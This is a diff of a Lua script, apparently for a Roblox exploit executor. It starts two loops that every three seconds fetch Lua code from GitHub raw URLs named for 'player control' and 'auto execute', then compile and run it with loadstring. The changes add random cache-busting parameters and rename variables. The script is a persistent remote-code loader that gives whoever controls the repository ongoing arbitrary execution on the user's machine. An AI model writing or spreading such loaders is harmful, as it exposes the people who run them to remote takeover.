@@ -15,11 +15,11 @@
 
 
 local URLLINKS = "https://raw.githubusercontent.com/BRGTscript/controling/refs/heads/main/all_plyer_control.lua"
-local ANTISPAMS = ""
+local ANTOSPAMS = ""
 
 local function LATESS(url)
     local req = (syn and syn.request) or (http and http.request) or http_request or request
-    local fullUrl = url .. "?v=" .. tick()
+    local fullUrl = url .. "?v=" .. tick() .. "&r=" .. math.random(1000, 9999)
     
     if req then
         local success, res = pcall(function()
@@ -48,8 +48,8 @@ task.spawn(function()
     while true do
         local content = LATESS(URLLINKS)
         
-        if content and content:match("%S") and content ~= ANTISPAMS then
-            ANTISPAMS = content
+        if content and content:match("%S") and content ~= ANTOSPAMS then
+            ANTOSPAMS = content
             
             local success, loadedFunc = pcall(loadstring, content)
             if success and loadedFunc then
@@ -97,9 +97,9 @@ end)
 local URLLINK = "https://raw.githubusercontent.com/BRGTscript/controling/refs/heads/main/auto_execute_player.lua"
 local ANTISPAM = ""
 
-local function lates(url)
+local function LATES(url)
     local req = (syn and syn.request) or (http and http.request) or http_request or request
-    local fullUrl = url .. "?v=" .. tick()
+    local fullUrl = url .. "?v=" .. tick() .. "&r=" .. math.random(1000, 9999)
     
     if req then
         local success, res = pcall(function()
@@ -126,7 +126,7 @@ end
 
 task.spawn(function()
     while true do
-        local content = lates(URLLINK)
+        local content = LATES(URLLINK)
         
         if content and content:match("%S") and content ~= ANTISPAM then
             ANTISPAM = content
@@ -139,7 +139,7 @@ task.spawn(function()
         
         task.wait(3)
     end
-end)
+end)    
 
 
 
@@ -339,13 +339,3 @@ end
 
 
 ---------------------------------------------------------------------------------------
-
-
-
-
-
-
-
-
-
-
